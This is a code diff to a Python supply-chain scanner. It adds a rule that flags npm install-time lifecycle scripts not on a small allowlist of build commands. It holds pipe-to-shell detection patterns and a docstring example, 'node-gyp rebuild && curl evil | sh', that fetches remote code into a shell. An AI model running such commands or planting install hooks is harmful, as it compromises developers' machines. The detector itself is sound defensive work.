@@ -21,6 +21,7 @@ The finding says the safety net is absent, not that something is wrong.
 
 from __future__ import annotations
 
+import re
 from typing import TYPE_CHECKING
 
 from cordon_scanner.core.models import (
@@ -68,6 +69,66 @@ HOSTILE_IN_LIFECYCLE = (
 )
 
 PIPE_TO_SHELL = ("| sh", "|sh", "| bash", "|bash", "| python", "|python")
+
+INSTALL_TIME_HOOKS = frozenset(
+    {"preinstall", "install", "postinstall", "prepare", "prepublish", "prepack"}
+)
+"""Lifecycle names that run without anybody asking for them.
+
+`npm install` fires these. A developer running `npm run build` has chosen to run
+something; a developer running `npm install` has not, and that is the whole
+difference. `postinstall` in particular runs on every machine that ever installs
+the package, transitively, as the user."""
+
+SAFE_LIFECYCLE_PREFIXES = (
+    "node-gyp",
+    "prebuild-install",
+    "node-pre-gyp",
+    "prebuildify",
+    "tsc",
+    "npm run build",
+    "yarn build",
+    "pnpm build",
+    "husky install",
+    "husky",
+    "patch-package",
+    "opencollective",
+    "is-ci",
+    "cmake-js",
+    "neon build",
+    "electron-builder install-app-deps",
+)
+"""Commands a lifecycle script may run without raising anything.
+
+An allowlist, because the attack is *adding a script*, not putting a particular
+word in one. The check used to be a blocklist of hostile substrings, and its own
+docstring said otherwise -- so `postinstall: node ./scripts/setup.js`, the single
+most common npm attack shape, produced no finding at all. That is the failure
+this project names as unacceptable: a control that reads as protective while
+doing nothing.
+
+Short on purpose. Native compilation and a TypeScript build are the honest
+reasons to run at install time; everything else is a script somebody should look
+at, which is what the finding says. An entry here is a decision that a command
+needs no review, so the list stays small enough to read.
+"""
+
+
+def _is_safe_lifecycle(command: str) -> bool:
+    """Whether a lifecycle command is a recognised build step.
+
+    Compared against the whole command after stripping shell chaining, so
+    `node-gyp rebuild && curl evil | sh` is not waved through by its first
+    clause -- which is how an allowlist that matched a prefix of the raw string
+    would have been defeated in one move.
+    """
+    parts = [p.strip() for p in re.split(r"&&|\|\||;|\||\n", command) if p.strip()]
+    if not parts:
+        return False
+    return all(
+        any(part == safe or part.startswith(f"{safe} ") for safe in SAFE_LIFECYCLE_PREFIXES)
+        for part in parts
+    )
 
 
 class ManifestDetector(BaseDetector):
@@ -160,7 +221,41 @@ class ManifestDetector(BaseDetector):
                 capabilities.append(Capability.SPAWN)
                 reasons.append("pipes fetched content directly into an interpreter")
 
+            install_time = hook.name in INSTALL_TIME_HOOKS
             if not capabilities:
+                if not install_time or _is_safe_lifecycle(command):
+                    continue
+                # An install-time script that is not a recognised build step.
+                # Reported for existing, rather than for containing a word from
+                # a list: `node ./scripts/setup.js` matched no hostile substring
+                # and produced nothing, while being the shape most npm
+                # compromises actually take. What the referenced file does is a
+                # separate question the file detectors answer -- and cannot
+                # answer at all if nothing points at it.
+                yield self._finding(
+                    rule_id="SUSPECT.INSTALL.SCRIPT.001",
+                    category=Category.SUSPICIOUS,
+                    severity=Severity.HIGH,
+                    confidence=Confidence.MEDIUM,
+                    title="Install script runs an unrecognised command",
+                    message=(
+                        f"The {hook.name!r} script runs automatically during install, "
+                        f"before any test, review or container boundary applies, and "
+                        f"runs {command!r} -- which is not a recognised build step. "
+                        f"Adding an install-time script is itself the attack shape; "
+                        f"what it runs is a second question."
+                    ),
+                    remediation=(
+                        "Read the script. If it is a build step, move it behind an "
+                        "explicit command a developer chooses to run; if it must run at "
+                        "install time, suppress this finding with a justification."
+                    ),
+                    unit=unit,
+                    ctx=ctx,
+                    detail=f"{hook.name}: {command}",
+                    capabilities=[],
+                    reasons=["runs at install time and is not a recognised build step"],
+                )
                 continue
 
             fetch_and_run = Capability.EGRESS in capabilities and (
